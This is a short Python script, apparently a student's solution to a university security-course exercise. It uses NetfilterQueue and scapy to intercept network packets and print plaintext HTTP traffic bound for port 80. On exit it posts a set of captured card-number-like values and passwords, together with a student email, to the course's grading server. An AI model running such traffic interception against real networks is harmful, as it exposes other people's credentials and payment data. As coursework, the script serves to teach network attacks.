from netfilterqueue import NetfilterQueue
from scapy.all import *
import requests
import json

def print_and_accept(pkt):
    pkt.accept()
    raw=pkt.get_payload()
    ip = IP(raw)
    if (ip.haslayer(Raw) and ip[TCP].dport==80): 
						http=ip[Raw].load.decode()
						encoding=http.split("\"")[1]
						#hey=encoding.split(" ")[0]
						#json.loads(hey, codecs.getreader(hey))
						print("\n\n\n\n    ",pkt, "\n      ", http, "\n       ")
		

nfqueue = NetfilterQueue()
nfqueue.bind(0, print_and_accept, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
	payload = {'student_email': 'zeineb.sahnoun@epfl.ch', 'secrets': ['4851.9488.6474.8195',';UNHVSEDH28XH','1349/1920/9271/8690','KH3BR2?3C;890J','9751/6380/6308/8864']}
	r = requests.post('http://​com402.epfl.ch/hw1/ex4/sensitive', json=payload)
	print("status    " , r.status_code,"  text  ", r.text)
	print('')

nfqueue.unbind()
